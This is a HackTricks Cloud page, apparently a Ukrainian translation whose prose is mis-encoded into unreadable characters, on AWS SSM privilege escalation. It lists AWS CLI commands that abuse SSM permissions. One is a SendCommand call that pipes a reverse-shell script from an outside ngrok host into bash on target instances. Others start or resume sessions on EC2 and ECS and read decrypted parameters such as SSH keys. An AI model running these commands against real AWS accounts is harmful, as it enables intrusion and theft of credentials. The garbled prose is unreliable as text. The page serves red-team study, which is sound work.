# AWS - –ü—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ SSM

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ –≤–∞—à—É **–∫–æ–º–ø–∞–Ω—ñ—é –≤ —Ä–µ–∫–ª–∞–º—ñ –Ω–∞ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É —Ñ–æ—Ä–º–∞—Ç—ñ PDF**, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤.

</details>

## SSM

–î–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø—Ä–æ SSM –ø–µ—Ä–µ–≥–ª—è–Ω—å—Ç–µ:

{% content-ref url="../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/" %}
[aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum](../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/)
{% endcontent-ref %}

### `ssm:SendCommand`

–ê—Ç–∞–∫—É–≤–∞–ª—å–Ω–∏–∫ –∑ –¥–æ–∑–≤–æ–ª–æ–º **`ssm:SendCommand`** –º–æ–∂–µ **–≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ –∫–æ–º–∞–Ω–¥–∏ –≤ –µ–∫–∑–µ–º–ø–ª—è—Ä–∞—Ö**, —â–æ –ø—Ä–∞—Ü—é—é—Ç—å –∑ Amazon SSM Agent —Ç–∞ **–∫–æ–º–ø—Ä–æ–º–µ—Ç—É–≤–∞—Ç–∏ —Ä–æ–ª—å IAM**, —â–æ –ø—Ä–∞—Ü—é—î –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –Ω—å–æ–≥–æ.
```bash
# Check for configured instances
aws ssm describe-instance-information
aws ssm describe-sessions --state Active

# Send rev shell command
aws ssm send-command --instance-ids "$INSTANCE_ID" \
--document-name "AWS-RunShellScript" --output text \
--parameters commands="curl https://reverse-shell.sh/4.tcp.ngrok.io:16084 | bash"

# If you are in the machine you can capture the reverseshel inside of it
nc -lvnp 4444 #Inside the EC2 instance
aws ssm send-command --instance-ids "$INSTANCE_ID" \
--document-name "AWS-RunShellScript" --output text \
--parameters commands="curl https://reverse-shell.sh/127.0.0.1:4444 | bash"
```
**–ü–æ—Ç–µ–Ω—Ü—ñ–π–Ω–∏–π –≤–ø–ª–∏–≤:** –ü—Ä—è–º–µ –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ –¥–æ —Ä–æ–ª–µ–π IAM EC2, –ø—Ä–∏—î–¥–Ω–∞–Ω–∏—Ö –¥–æ –∑–∞–ø—É—â–µ–Ω–∏—Ö –µ–∫–∑–µ–º–ø–ª—è—Ä—ñ–≤ –∑ –∑–∞–ø—É—â–µ–Ω–∏–º–∏ –∞–≥–µ–Ω—Ç–∞–º–∏ SSM.

### `ssm:StartSession`

–ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ –∑ –¥–æ–∑–≤–æ–ª–æ–º **`ssm:StartSession`** –º–æ–∂–µ **–∑–∞–ø—É—Å—Ç–∏—Ç–∏ —Å–µ–∞–Ω—Å, —Å—Ö–æ–∂–∏–π –Ω–∞ SSH, –Ω–∞ –µ–∫–∑–µ–º–ø–ª—è—Ä–∞—Ö**, –Ω–∞ —è–∫–∏—Ö –ø—Ä–∞—Ü—é—î –∞–≥–µ–Ω—Ç Amazon SSM, —Ç–∞ **–∫–æ–º–ø—Ä–æ–º–µ—Ç—É–≤–∞—Ç–∏ —Ä–æ–ª—å IAM**, —è–∫–∞ –ø—Ä–∞—Ü—é—î –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –Ω—å–æ–≥–æ.
```bash
# Check for configured instances
aws ssm describe-instance-information
aws ssm describe-sessions --state Active

# Send rev shell command
aws ssm start-session --target "$INSTANCE_ID"
```
{% hint style="danger" %}
–î–ª—è –ø–æ—á–∞—Ç–∫—É —Å–µ—Å—ñ—ó –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ **SessionManagerPlugin**: [https://docs.aws.amazon.com/systems-manager/latest/userguide/install-plugin-macos-overview.html](https://docs.aws.amazon.com/systems-manager/latest/userguide/install-plugin-macos-overview.html)
{% endhint %}

**–ü–æ—Ç–µ–Ω—Ü—ñ–π–Ω–∏–π –≤–ø–ª–∏–≤:** –ü—Ä—è–º–µ –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ –¥–æ —Ä–æ–ª–µ–π IAM EC2, –ø—Ä–∏–∫—Ä—ñ–ø–ª–µ–Ω–∏—Ö –¥–æ –∑–∞–ø—É—â–µ–Ω–∏—Ö –µ–∫–∑–µ–º–ø–ª—è—Ä—ñ–≤ –∑ –∑–∞–ø—É—â–µ–Ω–∏–º–∏ –∞–≥–µ–Ω—Ç–∞–º–∏ SSM.

#### –ü—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ –¥–æ ECS

–ö–æ–ª–∏ **–∑–∞–¥–∞—á—ñ ECS** –≤–∏–∫–æ–Ω—É—é—Ç—å—Å—è –∑ —É–≤—ñ–º–∫–Ω–µ–Ω–∏–º **`ExecuteCommand`**, –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ –∑ –¥–æ—Å—Ç–∞—Ç–Ω—ñ–º–∏ –¥–æ–∑–≤–æ–ª–∞–º–∏ –º–æ–∂—É—Ç—å –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ `ecs execute-command` –¥–ª—è **–≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–º–∞–Ω–¥–∏** –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞.\
–ó–≥—ñ–¥–Ω–æ –∑ [**–¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü—ñ—î—é**](https://aws.amazon.com/blogs/containers/new-using-amazon-ecs-exec-access-your-containers-fargate-ec2/), —Ü–µ –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è —à–ª—è—Ö–æ–º —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è –±–µ–∑–ø–µ—á–Ω–æ–≥–æ –∫–∞–Ω–∞–ª—É –º—ñ–∂ –ø—Ä–∏—Å—Ç—Ä–æ—î–º, —è–∫–∏–π –≤–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç–µ –¥–ª—è —ñ–Ω—ñ—Ü—ñ—é–≤–∞–Ω–Ω—è –∫–æ–º–∞–Ω–¥–∏ "_exec_", —Ç–∞ —Ü—ñ–ª—å–æ–≤–∏–º –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–æ–º –∑ SSM Session Manager.\
–û—Ç–∂–µ, –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ –∑ `ssm:StartSession` –∑–º–æ–∂—É—Ç—å **–æ—Ç—Ä–∏–º–∞—Ç–∏ –æ–±–æ–ª–æ–Ω–∫—É –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –∑–∞–≤–¥–∞–Ω—å ECS** –∑ —É–≤—ñ–º–∫–Ω–µ–Ω–æ—é —Ü—ñ—î—é –æ–ø—Ü—ñ—î—é, –ø—Ä–æ—Å—Ç–æ –≤–∏–∫–æ–Ω–∞–≤—à–∏:
```bash
aws ssm start-session --target "ecs:CLUSTERNAME_TASKID_RUNTIMEID"
```
**–ü–æ—Ç–µ–Ω—Ü—ñ–π–Ω–∏–π –≤–ø–ª–∏–≤:** –ü—Ä—è–º–µ –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ –¥–æ —Ä–æ–ª–µ–π `ECS`IAM, –ø—Ä–∏–∫—Ä—ñ–ø–ª–µ–Ω–∏—Ö –¥–æ –∑–∞–ø—É—â–µ–Ω–∏—Ö –∑–∞–≤–¥–∞–Ω—å –∑ —É–≤—ñ–º–∫–Ω–µ–Ω–∏–º `ExecuteCommand`.

### `ssm:ResumeSession`

–ê—Ç–∞–∫—É–≤–∞–ª—å–Ω–∏–∫ –∑ –¥–æ–∑–≤–æ–ª–æ–º **`ssm:ResumeSession`** –º–æ–∂–µ **–ø–µ—Ä–µ–∑–∞–ø—É—Å—Ç–∏—Ç–∏ —Å–µ–∞–Ω—Å, —Å—Ö–æ–∂–∏–π –Ω–∞ SSH, –Ω–∞ –µ–∫–∑–µ–º–ø–ª—è—Ä–∞—Ö**, –Ω–∞ —è–∫–∏—Ö –ø—Ä–∞—Ü—é—î Amazon SSM Agent –∑ **–≤—ñ–¥–∫–ª—é—á–µ–Ω–∏–º** —Å—Ç–∞–Ω–æ–º —Å–µ–∞–Ω—Å—É SSM —Ç–∞ **–∫–æ–º–ø—Ä–æ–º–µ—Ç—É–≤–∞—Ç–∏ —Ä–æ–ª—å IAM**, —è–∫–∞ –ø—Ä–∞—Ü—é—î –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –Ω—å–æ–≥–æ.
```bash
# Check for configured instances
aws ssm describe-sessions

# Get resume data (you will probably need to do something else with this info to connect)
aws ssm resume-session \
--session-id Mary-Major-07a16060613c408b5
```
**–ü–æ—Ç–µ–Ω—Ü—ñ–π–Ω–∏–π –≤–ø–ª–∏–≤:** –ü—Ä—è–º–µ –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ –¥–æ —Ä–æ–ª–µ–π IAM EC2, –ø—Ä–∏—î–¥–Ω–∞–Ω–∏—Ö –¥–æ –∑–∞–ø—É—â–µ–Ω–∏—Ö –µ–∫–∑–µ–º–ø–ª—è—Ä—ñ–≤ –∑ –∑–∞–ø—É—â–µ–Ω–∏–º–∏ –∞–≥–µ–Ω—Ç–∞–º–∏ SSM —Ç–∞ –≤—ñ–¥–∫–ª—é—á–µ–Ω–∏–º–∏ —Å–µ–∞–Ω—Å–∞–º–∏.

### `ssm:DescribeParameters`, (`ssm:GetParameter` | `ssm:GetParameters`)

–ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ –∑ –≤–∫–∞–∑–∞–Ω–∏–º–∏ –¥–æ–∑–≤–æ–ª–∞–º–∏ –∑–º–æ–∂–µ –ø–µ—Ä–µ–≥–ª—è–¥–∞—Ç–∏ **–ø–∞—Ä–∞–º–µ—Ç—Ä–∏ SSM** —Ç–∞ **—á–∏—Ç–∞—Ç–∏ —ó—Ö —É –≤—ñ–¥–∫—Ä–∏—Ç–æ–º—É –≤–∏–≥–ª—è–¥—ñ**. –£ —Ü–∏—Ö –ø–∞—Ä–∞–º–µ—Ç—Ä–∞—Ö –≤–∏ —á–∞—Å—Ç–æ –º–æ–∂–µ—Ç–µ **–∑–Ω–∞–π—Ç–∏ —á—É—Ç–ª–∏–≤—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é**, —Ç–∞–∫—É —è–∫ –∫–ª—é—á—ñ SSH –∞–±–æ –∫–ª—é—á—ñ API.
```bash
aws ssm describe-parameters
# Suppose that you found a parameter called "id_rsa"
aws ssm get-parameters --names id_rsa --with-decryption
aws ssm get-parameter --name id_rsa --with-decryption
```
**–ü–æ—Ç–µ–Ω—Ü—ñ–π–Ω–∏–π –≤–ø–ª–∏–≤:** –ó–Ω–∞–π—Ç–∏ —á—É—Ç–ª–∏–≤—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –ø–∞—Ä–∞–º–µ—Ç—Ä—ñ–≤.

### `ssm:ListCommands`

–ê—Ç–∞–∫—É—é—á–∏–π –∑ —Ü–∏–º –¥–æ–∑–≤–æ–ª–æ–º –º–æ–∂–µ –ø–µ—Ä–µ–≥–ª—è–Ω—É—Ç–∏ –≤—Å—ñ **–∫–æ–º–∞–Ω–¥–∏**, –≤—ñ–¥–ø—Ä–∞–≤–ª–µ–Ω—ñ —Ç–∞, –º–æ–∂–ª–∏–≤–æ, –∑–Ω–∞–π—Ç–∏ –Ω–∞ –Ω–∏—Ö **—á—É—Ç–ª–∏–≤—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é**.
```
aws ssm list-commands
```
**–ü–æ—Ç–µ–Ω—Ü—ñ–π–Ω–∏–π –≤–ø–ª–∏–≤:** –ó–Ω–∞—Ö–æ–¥–∂–µ–Ω–Ω—è —á—É—Ç–ª–∏–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –∫–æ–º–∞–Ω–¥–Ω–∏—Ö —Ä—è–¥–∫—ñ–≤.

### `ssm:GetCommandInvocation`, (`ssm:ListCommandInvocations` | `ssm:ListCommands`)

–ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ –∑ —Ü–∏–º–∏ –¥–æ–∑–≤–æ–ª–∞–º–∏ –º–æ–∂–µ –ø–µ—Ä–µ–ª—ñ—á–∏—Ç–∏ –≤—Å—ñ **–∫–æ–º–∞–Ω–¥–∏**, –≤—ñ–¥–ø—Ä–∞–≤–ª–µ–Ω—ñ —Ç–∞ **–ø—Ä–æ—á–∏—Ç–∞—Ç–∏ –≤–∏–≤—ñ–¥**, —Å–ø–æ–¥—ñ–≤–∞—é—á–∏—Å—å –∑–Ω–∞–π—Ç–∏ –Ω–∞ –Ω—å–æ–º—É **—á—É—Ç–ª–∏–≤—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é**.
```bash
# You can use any of both options to get the command-id and instance id
aws ssm list-commands
aws ssm list-command-invocations

aws ssm get-command-invocation --command-id <cmd_id> --instance-id <i_id>
```
**–ü–æ—Ç–µ–Ω—Ü—ñ–π–Ω–∏–π –≤–ø–ª–∏–≤:** –ó–Ω–∞–π–¥—ñ—Ç—å —á—É—Ç–ª–∏–≤—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –≤ –≤–∏–≤–æ–¥—ñ –∫–æ–º–∞–Ω–¥–Ω–∏—Ö —Ä—è–¥–∫—ñ–≤.

### Codebuild

–í–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ SSM, —â–æ–± –ø–æ—Ç—Ä–∞–ø–∏—Ç–∏ –≤ –ø—Ä–æ–µ–∫—Ç codebuild, —è–∫–∏–π –±—É–¥—É—î—Ç—å—Å—è:

{% content-ref url="aws-codebuild-privesc.md" %}
[aws-codebuild-privesc.md](aws-codebuild-privesc.md)
{% endcontent-ref %}

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ —Å–≤–æ—é **–∫–æ–º–ø–∞–Ω—ñ—é –≤ —Ä–µ–∫–ª–∞–º—ñ –Ω–∞ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É —Ñ–æ—Ä–º–∞—Ç—ñ PDF**, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤.

</details>
